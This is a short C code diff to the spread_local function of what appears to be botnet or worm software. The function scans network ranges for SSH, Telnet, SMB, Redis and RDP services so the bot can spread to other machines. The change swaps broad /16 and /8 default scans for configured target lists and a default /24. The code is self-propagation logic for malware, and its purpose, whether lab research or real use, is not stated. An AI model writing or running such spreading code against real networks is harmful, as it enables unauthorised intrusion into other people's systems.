@@ -551,13 +551,19 @@ int spread_local(notnet_bot_t *bot) {
         log_info("Using %d peers for spread", bot->peer_count);
     }
     
-    /* Scan local subnet */
-    scan_subnet(bot, "192.168.0.0/16",
-                SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP);
+    /* Scan explicit targets if configured (overrides defaults) */
+    if (bot->scan_target_count > 0) {
+        log_info("Scanning %d explicit targets", bot->scan_target_count);
+        uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
+        for (int i = 0; i < bot->scan_target_count && i < 16; i++) {
+            scan_subnet(bot, bot->scan_targets[i], all_services);
+        }
+        return 0;
+    }
     
-    /* Scan additional subnets */
-    scan_subnet(bot, "10.0.0.0/8",
-                SPREAD_SSH | SPREAD_SMB | SPREAD_REDIS);
+    /* Default: just scan local /24 (not /16) */
+    scan_subnet(bot, "192.168.1.0/24",
+                SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP);
     
     return 0;
 }
